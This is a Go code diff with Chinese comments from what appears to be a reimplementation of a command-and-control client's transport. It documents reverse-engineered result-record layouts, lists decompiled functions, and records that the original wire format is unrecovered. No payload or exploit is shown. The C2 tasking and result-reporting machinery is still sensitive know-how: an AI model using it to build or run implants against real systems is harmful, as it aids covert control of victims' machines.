@@ -520,6 +520,10 @@ func (t *kcpTransport) GetTasks() ([]TaskItem, error) {
 }
 
 func (t *kcpTransport) SendResult(taskID int64, result, status string) error {
+	// 未对齐点（已知、未修）：KCP 链路仍用 ResultRequest JSON 信封，而原版把
+	// 结果写成 24 字节记录块（见 transport_real.go 的 SendResult 与 main.go
+	// 「结果帧」一节）。KCP 的服务器侧按 JSON 键路由（c2engine/kcp.go 的
+	// LinkMsgMain 分支），改成记录需要同步改那一侧，而这不属于本次改动范围。
 	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})
 
 	t.mu.Lock()
@@ -860,9 +864,11 @@ func parseSysInfoMode(argv []byte) int {
 //	  str == 0 时什么都不发；否则 FUN_0100d5e0(0x75, 0, 1, 0, str, 0)
 //	  + FUN_0100d160(0x54, 1, 1, 0)
 //
-// 复刻端把结果文本经 SendResult 送出，因此这些记录只用于对齐与测试（默认
-// 丢弃，测试通过 resultFrameSink 观察）。不能把「负载值」塞进记录字段：那是
-// 另一条链路（FUN_0100eac0 的 load 缓冲）。
+// 这些 24 字节记录是原版结果通道的**内容**；它们怎样变成线路上的字节则
+// 未恢复（见下方「Result frames on the wire」一节）。原版的字符串负载由
+// FUN_0100eac0 以「8 字节指针单元」的形式挂进记录的 +0x10（再经 FUN_0100e940
+// → FUN_00fb9800 复制字符串、flags+0x01 写 0xfa），即进程内表示，不是可传输
+// 的封包。因此复刻端不构造该封包，传输层仍发 ResultRequest JSON。
 // ============================================================================
 
 // 结果帧码（上列各函数的字面量参数）。
@@ -876,6 +882,59 @@ const (
 	frameKindPong    = 0xb1 // FUN_010952e0 dec case 0x1a 的 'p' 变体
 	frameKindPing    = 0xb2 // FUN_010952e0 dec case 0x1a 的一般情形
 )
+
+// ============================================================================
+// Result frames on the wire — UNRECOVERED, do not assume an encoding
+// 结果帧的线路形态：未恢复
+//
+// 记录本身是实锤（见下一节的 FUN_0100d160 布局），但「记录怎样变成线路上的
+// 字节」在静态侧没有找到任何一个实现者——没有任何函数把缓冲区 +0x88/+0x90
+// 取出来写 socket。已排除的候选链路：
+//
+//	FUN_015f9c60   泛型参数构造器（FUN_0040d240 取对象 + 逐字段写入），与记录缓冲无关
+//	FUN_015f8480   实为 FUN_015f8320（反编译所标地址为该函数内部），做的是
+//	               指针遍历 + 正则/分割，不碰记录缓冲
+//	FUN_0102ec00 / FUN_01065280 / FUN_01010ac0 / FUN_01047600
+//	               都只是往缓冲里产生记录再向下传，本身不序列化
+//	FUN_010f3220   只解析请求并调用 FUN_010952e0，不发送
+//	操作数扫描 +0x88 / +0x90 只命中用户结构体，没有池缓冲的读取者
+//
+// 已确证、下一次应从这些点接着查的事实：
+//
+//	FUN_0100cb40  引擎池分配 0x130 字节缓冲对象，清零 +0x44 起 0xa8 字节，
+//	              挂链后立即发一条 0x08 记录（A=0,B=1,C=0）
+//	FUN_0100cf60  以 24 字节为单位扩容，容量上限 0x2b*24 = 1032
+//	FUN_0100e1a0  批量路径：把「每记录 4 字节」的压缩描述符数组展开成 24 字节记录
+//	              —— 记录种类 1..4 是远端解析的紧凑指针，不是完整记录
+//	FUN_0100eac0  负载不在记录里：它分配 8 字节单元（FUN_00ec0cc0），把该单元指针
+//	              写进记录的 +0x10，并登记析构 FUN_0100eca0；字符串负载另走
+//	              FUN_0100e940 → FUN_00fb9800（makestringcopy），flags+0x01 = 0xfa
+//	              任务完成码集合（FUN_0100e600 分支）：-3,-11,-0x1e,-0x1f,-2,
+//	              -0x11,-0x15,-0x16,-0x1a,-0x19
+//	服务器侧消费端同样是「缓冲内」的：
+//	              FUN_0100dec0 / FUN_0100dda0 把记录序号写进 cmd+0x50[index] 索引表；
+//	              FUN_0100df40 发 0xa6(1,1,0)；FUN_0100dfa0 把 record[1] 的种类
+//	              改写为 0xb8
+//
+// 因此复刻端**不构造**线路形态：SendResult 沿用既有的 ResultRequest JSON 信封
+// （见各传输实现），这是一处已记录的偏差。任何「看起来像」的记录编码都是编造的
+// ——指针与长度、负载内联与否都没有证据，两端自洽只能证明自洽，不能证明对齐。
+// ============================================================================
+
+// resultRecordBytes 把记录序列编码成连续 24 字节记录块（缓冲内布局）。
+//
+// 注意：这只复刻缓冲内部的排布（+0x88 起、每条 24 字节，计数器 +0x90），
+// 它**不是**线上格式——照它发出去是没有依据的。目前没有生产调用者。
+// resultRecordBytes serialises records into the contiguous 24-byte block held
+// inside the original's output buffer. This is the IN-BUFFER layout, NOT a
+// recovered wire format — nothing in the binary sends these bytes as-is.
+func resultRecordBytes(frames []resultFrame) []byte {
+	out := make([]byte, 0, len(frames)*24)
+	for _, f := range frames {
+		out = append(out, f.bytes()...)
+	}
+	return out
+}
 
 // resultFrame 是一条 24 字节记录（FUN_0100d160 写入的布局）。
 type resultFrame struct {
